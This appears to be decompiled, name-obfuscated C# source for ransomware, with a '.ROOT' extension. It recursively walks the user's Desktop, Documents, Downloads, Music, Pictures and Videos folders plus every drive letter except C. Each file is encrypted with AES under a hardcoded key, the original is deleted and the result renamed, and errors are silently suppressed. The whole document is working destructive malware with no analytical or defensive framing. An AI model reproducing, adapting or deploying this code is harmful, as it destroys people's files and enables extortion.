using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class Class2
{
	public static string string_0;

	public static void smethod_0()
	{
		try
		{
			string string_ = "KXZQEBBPY7DZaz9000000002";
			smethod_1("C:\\Users\\" + Environment.UserName + "\\Desktop\\", string_);
			smethod_1("C:\\Users\\" + Environment.UserName + "\\Documents\\", string_);
			smethod_1("C:\\Users\\" + Environment.UserName + "\\Downloads\\", string_);
			smethod_1("C:\\Users\\" + Environment.UserName + "\\Music\\", string_);
			smethod_1("C:\\Users\\" + Environment.UserName + "\\Pictures\\", string_);
			smethod_1("C:\\Users\\" + Environment.UserName + "\\Videos\\", string_);
			string[] array = new string[25]
			{
				"A:\\", "B:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\",
				"L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\",
				"V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"
			};
			string[] array2 = array;
			foreach (string string_2 in array2)
			{
				try
				{
					smethod_1(string_2, string_);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	private static void smethod_1(string string_1, string string_2)
	{
		if (string_1.Equals(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), StringComparison.OrdinalIgnoreCase))
		{
			Console.WriteLine("Skipping directory: " + string_1);
			return;
		}
		string[] files = Directory.GetFiles(string_1);
		foreach (string string_3 in files)
		{
			smethod_2(string_3, string_2);
		}
		string[] directories = Directory.GetDirectories(string_1);
		foreach (string string_4 in directories)
		{
			smethod_1(string_4, string_2);
		}
	}

	private static void smethod_2(string string_1, string string_2)
	{
		using Aes aes = Aes.Create();
		aes.Key = Encoding.UTF8.GetBytes(string_2);
		aes.IV = new byte[16];
		string text = string_1 + ".encrypted";
		using (FileStream fileStream = new FileStream(string_1, FileMode.Open))
		{
			using FileStream stream = new FileStream(text, FileMode.Create);
			using ICryptoTransform transform = aes.CreateEncryptor();
			using CryptoStream destination = new CryptoStream(stream, transform, CryptoStreamMode.Write);
			fileStream.CopyTo(destination);
		}
		File.Delete(string_1);
		File.Move(text, string_1 + string_0);
		Console.WriteLine("Encrypted file: " + string_1);
	}

	public Class2()
	{
		Class5.qSmkGw9zBHCc6();
		base._002Ector();
	}

	static Class2()
	{
		Class5.qSmkGw9zBHCc6();
		string_0 = ".ROOT";
	}
}
